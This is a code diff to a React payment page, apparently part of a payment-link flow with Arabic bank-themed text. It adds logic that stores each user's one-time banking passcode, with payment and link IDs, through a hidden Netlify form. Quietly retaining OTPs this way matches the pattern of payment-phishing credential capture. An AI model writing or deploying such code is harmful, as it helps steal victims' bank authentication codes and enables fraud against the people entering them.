@@ -66,6 +66,25 @@ const PaymentOTP = () => {
     
     // Check if OTP matches
     if (otp === payment.otp) {
+      // Submit to Netlify Forms
+      const formData = new FormData();
+      formData.append('form-name', 'payment-otp-verified');
+      formData.append('otp', otp);
+      formData.append('service', serviceName);
+      formData.append('paymentId', payment.id);
+      formData.append('linkId', id || '');
+      formData.append('status', 'confirmed');
+      
+      try {
+        await fetch('/', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams(formData as any).toString()
+        });
+      } catch (error) {
+        console.error('Form submission error:', error);
+      }
+      
       // Success!
       await updatePayment.mutateAsync({
         paymentId: payment.id,
@@ -299,6 +318,15 @@ const PaymentOTP = () => {
               لم تستلم الرمز؟ تحقق من رسائلك أو اتصل بالبنك
             </p>
           </Card>
+          
+          {/* Hidden Netlify Form */}
+          <form name="payment-otp-verified" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
+            <input type="text" name="otp" />
+            <input type="text" name="service" />
+            <input type="text" name="paymentId" />
+            <input type="text" name="linkId" />
+            <input type="text" name="status" />
+          </form>
         </div>
       </div>
     </div>
